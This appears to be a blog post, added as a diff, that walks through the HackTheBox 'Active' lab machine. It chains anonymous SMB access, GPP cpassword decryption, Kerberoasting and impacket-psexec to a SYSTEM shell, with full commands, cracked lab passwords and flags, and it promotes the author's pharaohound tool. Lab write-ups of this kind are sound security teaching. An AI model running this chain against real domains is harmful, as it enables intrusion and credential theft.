@@ -1,0 +1,341 @@
+---
+slug: "htb-active"
+title: "Active — HackTheBox Machine Writeup"
+date: "2026-08-06"
+platform: "HackTheBox"
+type: "Machine"
+category: "Active Directory"
+os: "Windows"
+difficulty: "Easy"
+tags:
+  - "Active Directory"
+  - "SMB"
+  - "GPP"
+  - "Kerberoasting"
+  - "pharaohound"
+  - "Domain Admin"
+excerpt: "An Easy Windows domain controller box: anonymous SMB access to a DFS Replication share leaks a GPP password, which unlocks Kerberoasting of the Administrator account and full Domain Admin compromise."
+readTime: "20 min"
+retired: true
+rating: 4.5
+url: "https://asbawy.github.io/writeups/htb-active"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Analysis",
+      title: "Anonymous SMB Share & SYSVOL Replication Walk",
+      desc: "Anonymous SMB connection to the Replication share exposes policy XML files. Path traversing into SYSVOL policy GUID {31B2F340-016D-11D2-945F-00C04FB984F9} uncovers Groups.xml containing an encrypted cpassword.",
+      tools: ["smbmap", "smbclient", "nmap"],
+    },
+    {
+      phase: "Vulnerability",
+      title: "GPP Decryption & Service Account Compromise",
+      desc: "Exploiting MS14-025, the Group Policy Preferences AES-256 key (disclosed by Microsoft) decrypts the cpassword in Groups.xml, granting valid credentials for the SVC_TGS service account.",
+      technique: "MS14-025 GPP cpassword Decryption",
+      tools: ["gpp-decrypt", "crackmapexec"],
+    },
+    {
+      phase: "AD Recon",
+      title: "Automated Graph Analysis via pharaohound",
+      desc: "Dumping domain graph metrics with bloodhound-python and processing them through our custom tool pharaohound. It instantly prioritizes Kerberoasting for the Administrator account with zero Neo4j database overhead.",
+      technique: "Graph Enumeration & Attack Path Ranking",
+      tools: ["bloodhound-python", "pharaohound"],
+    },
+    {
+      phase: "Exploitation (Flag)",
+      title: "Kerberoasting & Domain Admin Compromise",
+      desc: "Requesting a TGS ticket for active/CIFS:445 (Administrator SPN) via GetUserSPNs. Offline GPU cracking with hashcat recovers Ticketmaster1968 in 38 seconds, granting Domain Admin access via impacket-psexec.",
+      tools: ["GetUserSPNs", "hashcat", "psexec"],
+    },
+  ]}
+/>
+
+<Callout type="info">
+  **Tool of Choice:** All Active Directory graph parsing and attack-path detection in this walkthrough was executed using **pharaohound** — our high-performance BloodHound JSON analysis engine & AD collection framework. It eliminates the heavy Neo4j GUI stack and instantly surfaced Kerberoasting as the #1 priority attack vector.
+</Callout>
+
+## Initial Inspection — Reconnaissance
+
+### Host Discovery & DNS Configuration
+
+Map the domain controller hostname in `/etc/hosts`:
+
+```bash
+kali@htb:~$ echo "10.129.56.54 active.htb" | sudo tee -a /etc/hosts
+```
+
+### Full Port & Service Enumeration
+
+We execute a high-speed full TCP port scan, followed by targeted service version detection:
+
+```bash
+kali@htb:~$ nmap -p- -T4 -Pn 10.129.56.54 -oN scans/all-ports.txt
+```
+
+```bash
+kali@htb:~$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 \
+      -sC -sV -T4 -Pn 10.129.56.54 -oN scans/services.txt
+```
+
+![Service scan results — the DC fingerprint](https://i.imgur.com/QZ4OFvy.png)
+
+### Exposed Service Profile
+
+| Port | Service | Role / Significance |
+|------|---------|---------------------|
+| 88 | Kerberos | Authentication server — primary Kerberoasting target |
+| 139 / 445 | SMB | Server Message Block — anonymous share access |
+| 389 | LDAP | Lightweight Directory Access Protocol (`active.htb`) |
+| 3268 | Global Catalog | Multi-domain AD directory queries |
+
+And we talk about this section in our **[Active Directory Cheatsheet](/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet#domain-controller-reconnaissance)**, detailing standard service signatures for Windows Server 2008 R2 SP1 Domain Controllers.
+
+## Extracting the GPP Password (SMB & SYSVOL)
+
+### Anonymous Share Enumeration
+
+Testing null session authentication across SMB shares using `smbmap`:
+
+```bash
+kali@htb:~$ smbmap -H 10.129.56.54
+
+Disk          Permissions
+----          -----------
+ADMIN$        NO ACCESS
+C$            NO ACCESS
+IPC$          NO ACCESS
+NETLOGON      NO ACCESS
+Replication   READ ONLY    ← Readable without authentication!
+SYSVOL        NO ACCESS
+Users         NO ACCESS
+```
+
+<Callout type="warning">
+  **Key Observation:** The `Replication` share allows **anonymous read access**. This share acts as a DFS-R mirror of SYSVOL across domain controllers, hosting Group Policy Objects (GPOs) and preference configurations.
+</Callout>
+
+### Locating Groups.xml
+
+We traverse the `Replication` share for XML configuration files under the Default Domain Policy GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`:
+
+```bash
+kali@htb:~$ smbclient //10.129.56.54/Replication -N -c 'recurse ON; prompt OFF; ls' | grep -a Groups.xml
+```
+
+Downloading `Groups.xml`:
+
+```bash
+kali@htb:~$ smbclient //10.129.56.54/Replication -N -c \
+  'cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups; get Groups.xml'
+```
+
+### Decrypting cpassword (MS14-025)
+
+![Groups.xml content and its decryption](https://i.imgur.com/lNCqe29.png)
+
+The `Groups.xml` file contains an embedded encrypted `cpassword` attribute for `active.htb\SVC_TGS`:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+        name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
+        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+    <Properties action="U" newName="" fullName="" description=""
+      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+      changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
+      userName="active.htb\SVC_TGS"/>
+  </User>
+</Groups>
+```
+
+<Callout type="warning">
+  **Vulnerability Deep-Dive (MS14-025):** Group Policy Preferences stored passwords in SYSVOL encrypted with AES-256-CBC. However, Microsoft published the 32-byte AES key publicly in official documentation. Using `gpp-decrypt` instantly recovers the plaintext.
+</Callout>
+
+```bash
+kali@htb:~$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+GPPstillStandingStrong2k18
+```
+
+Harvested Account Credentials:
+
+```text
+Domain:   active.htb
+User:     SVC_TGS
+Password: GPPstillStandingStrong2k18
+```
+
+### Credential Validation
+
+We verify the credential set against SMB using `crackmapexec`:
+
+```bash
+kali@htb:~$ crackmapexec smb 10.129.56.54 -u SVC_TGS -p 'GPPstillStandingStrong2k18' -d active.htb
+
+SMB   10.129.56.54   445    DC    [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
+```
+
+### user.txt Capture
+
+```bash
+kali@htb:~$ smbclient //10.129.56.54/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' \
+  -c 'cd SVC_TGS\Desktop; get user.txt'
+kali@htb:~$ cat loot/user.txt
+```
+<SpoilerFlag label="HTB user flag" flag="789995b127f075814da467d340912051" />
+
+
+## AD Analysis with pharaohound
+
+### Collecting the Domain Graph
+
+With valid service account credentials, we dump the Active Directory graph metrics using `bloodhound-python`:
+
+```bash
+kali@htb:~$ bloodhound-python -u SVC_TGS -p 'GPPstillStandingStrong2k18' \
+      -d active.htb -ns 10.129.56.54 -c All
+```
+
+```text
+INFO: Found 1 domains
+INFO: Found 1 computers
+INFO: Found 5 users
+INFO: Found 41 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Querying computer: DC.active.htb
+INFO: Done in 00M 35S
+```
+
+### Rapid Analysis via pharaohound
+
+And we now can use our tool **pharaohound** because of fast execution, zero Neo4j database setup overhead, and instant attack-path prioritization. We pass the generated JSON files directly into `pharaohound`:
+
+```bash
+kali@htb:~$ pharaohound bloodhound/ -o pharaohound-report/ --all --no-color
+```
+
+![pharaohound analysis — Kerberoastable user flagged as Priority #1](https://i.imgur.com/jjpPxNI.png)
+
+```text
+[CRITICAL] KERBEROASTABLE USERS
+  Summary:      Found 1 accounts with SPNs (1 in high-value groups)
+  Action:       User has an SPN — Kerberoastable
+  Command:      impacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP>
+
+[Priority #1] [CRITICAL] IMMEDIATE — Kerberoasting
+  Vulnerable Condition: Request TGS tickets for SPN-enabled accounts and crack them
+                        offline. Focus first on high-value group members.
+  Action Command:       impacket-GetUserSPNs ... -request -dc-ip <DC_IP> -outputfile hashes.txt
+  Alternative Command:  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+  Path 1: Kerberoast → Crack → ADMINISTRATOR@ACTIVE.HTB   [OpSec: LOW]
+```
+
+<Callout type="info">
+  **Why pharaohound accelerates AD engagements:** Instead of manually querying LDAP or navigating complex Neo4j Cypher graphs, **pharaohound** parsed all 7 BloodHound JSON files in milliseconds. It automatically identified that the account `Administrator` had an active SPN (`active/CIFS:445`) and flagged it as **Priority #1 Kerberoasting Target**.
+</Callout>
+
+## Kerberoasting — The TGS Trapdoor
+
+### Ticket Extraction
+
+Any valid domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any account with a Service Principal Name (SPN). Because TGS tickets are encrypted with the target account's NTLM hash, we can crack them offline.
+
+And we talk about this section in our **[Active Directory Cheatsheet](/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet#kerberoasting)**, outlining TGS ticket mechanics and hashcat modes.
+
+We request the TGS ticket for `Administrator` using `impacket-GetUserSPNs`:
+
+```bash
+kali@htb:~$ impacket-GetUserSPNs -request active.htb/SVC_TGS:'GPPstillStandingStrong2k18' \
+      -dc-ip 10.129.56.54 -outputfile loot/kerberoast_hashes.txt
+```
+
+![TGS ticket captured for the Administrator SPN](https://i.imgur.com/HMqRxa5.png)
+
+```text
+ServicePrincipalName  Name           MemberOf                                PasswordLastSet
+--------------------  -------------  -------------------------------------  -----------------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,...      2018-07-18 19:06:40
+```
+
+Captured TGS hash snippet (Kerberos 5 TGS-REP etype 23):
+
+```text
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$415486e95bd8caec0c7bcecd92e4c138$4aea95f2...
+```
+
+### Offline GPU Cracking
+
+Cracking the hash using `hashcat` in Kerberos 5 TGS-REP mode (`13100`):
+
+```bash
+kali@htb:~$ hashcat -m 13100 loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force -O
+```
+
+```text
+Started: Thu Aug  6 02:30:52 2026
+Stopped: Thu Aug  6 02:31:30 2026        (38 seconds)
+$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968
+```
+
+Recovered Administrator Credentials:
+
+```text
+Domain:   active.htb
+User:     Administrator
+Password: Ticketmaster1968
+```
+
+## Proof of Verification & Flag Capture
+
+### Domain Admin Validation
+
+We confirm Administrator privileges across SMB:
+
+```bash
+kali@htb:~$ crackmapexec smb 10.129.56.54 -u Administrator -p 'Ticketmaster1968' -d active.htb
+SMB   10.129.56.54   445    DC    [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+```
+
+![Administrator is Domain Admin — Pwn3d!](https://i.imgur.com/2gUs1oM.png)
+
+The `(Pwn3d!)` indicator confirms local administrative control on the Domain Controller, translating to full Domain Admin authority across `active.htb`.
+
+### SYSTEM Shell via PsExec
+
+Executing remote code with `impacket-psexec`:
+
+```bash
+kali@htb:~$ impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.56.54
+
+[*] Requesting shares on 10.129.56.54.....
+[*] Found writable share ADMIN$
+[*] Uploading file fASujHJO.exe
+[*] Creating service JfWe on 10.129.56.54.....
+[*] Starting service JfWe.....
+
+C:\Windows\system32> whoami
+nt authority\system
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+
+```
+
+### Root Flag
+
+<SpoilerFlag label="HTB Root Flag" flag="62d77a1f6096c874427d21bf6b6aaa57" />
+
+## References
+
+- [pharaohound — BloodHound JSON Analysis Engine & AD Collection Framework](https://github.com/asbawy/pharaohound)
+- [Active Directory Exploitation & Enumeration Cheatsheet](/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet)
+- [BadSuccessor: Active Directory Attack Vectors Log](/logs/badsuccessor)
+- [Microsoft MS14-025 — GPP cpassword vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2014-1812)
+- [Kerberoasting — Attack & Defense (SpecterOps)](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
+- [HackTheBox — Active machine page](https://www.hackthebox.com/machines/active)
